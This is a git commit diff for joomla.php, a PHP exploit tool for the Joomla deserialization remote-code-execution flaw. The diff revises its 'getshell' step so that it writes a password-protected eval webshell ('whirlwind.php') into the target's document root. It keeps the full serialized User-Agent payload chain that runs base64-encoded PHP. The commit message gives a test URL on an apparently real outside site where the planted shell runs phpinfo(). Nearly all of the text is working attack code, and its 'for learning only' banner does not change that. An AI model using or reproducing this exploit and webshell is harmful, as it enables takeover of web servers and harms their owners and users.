4dd4d188969efb28dc7e637e2cbc7898742cd4dc
Shaw <wind@fbi.org.in>
2015-12-17 13:26:47 +0800

    $_SERVER['DOCUMENT_ROOT']直接写shell
    $_SERVER['DOCUMENT_ROOT']，不用从Phpinfo里获取路径，即加快速度，还稳定啊，好笨。
    test : http://enoki.jp//whirlwind.php?whirlwind=phpinfo();

--- joomla.php
+++ joomla.php
@@ -11,16 +11,11 @@ if (isset($argv[2])) {
 }
 switch ($method) {
 case 'getshell':
-	// get web dir from phpinfo
-	$info = hackjoomla($url, 'phpinfo();');
-	preg_match("/DOCUMENT_ROOT(.*)</", $info, $info);
-	preg_match("/\">(.*)</", $info[1], $info);
 	//webshell code
-	$shell = '<?php eval($_REQUEST[whirlwind]);?>';
-
-	$getshellcommand = "file_put_contents('" . $info[1] . "/whirlwind.php', '$shell');";
+	$shell = '<?php @eval($_REQUEST[whirlwind]);';
+	$getshellcommand = 'file_put_contents($_SERVER[\'DOCUMENT_ROOT\'].\'/whirlwind.php\',\'' . $shell . '\');';
 	hackjoomla($url, $getshellcommand);
-	if (file_get_contents($url . '/whirlwind.php?whirlwind=echo+("hacked+by+whirlwind");') == "hacked by whirlwind") {
+	if (preg_match("/hello/", @file_get_contents($url . '/whirlwind.php?whirlwind=echo+"hello";')) !== 0) {
 		print "shell:" . $url . "/whirlwind.php\nPassword:whirlwind\n";
 	} else {
 		print "error?";
@@ -32,12 +27,13 @@ case 'command':
 	print $info;
 	break;
 default:
-	print("--------------- Joomla 反序列化漏洞利用工具---------------\n|      1.记得命令后头加分号，命令用单引号括起来。        |\n|      2.getshell因为种种原因不稳定，建议手工。          |\n|      3.仅供学习php代码使用                             |\n|Usage:                                                  |\n|php joomla.php http://xatusec.org getshell              |\n|php joomla.php http://xatusec.org command 'phpinfo();'  |\n-------------------Powered by Whirlwind-------------------\n");
+	print("--------------- Joomla 反序列化漏洞利用工具---------------\n|      1.记得命令后头加分号，命令用单引号括起来。        |\n|      2.仅供学习php代码使用                             |\n|Usage:                                                  |\n|php joomla.php http://xatusec.org getshell              |\n|php joomla.php http://xatusec.org command 'phpinfo();'  |\n-------------------Powered by Whirlwind-------------------\n");
 	break;
 }
 function hackjoomla($url, $command) {
 	$command = base64_encode($command);
 	$command = str_replace("=", "", $command);
+
 	$strlen = strlen($command) + 49;
 	$ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:' . $strlen . ':"eval(base64_decode(' . $command . '));JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}' . urldecode('%F0%9D%8C%86');
 
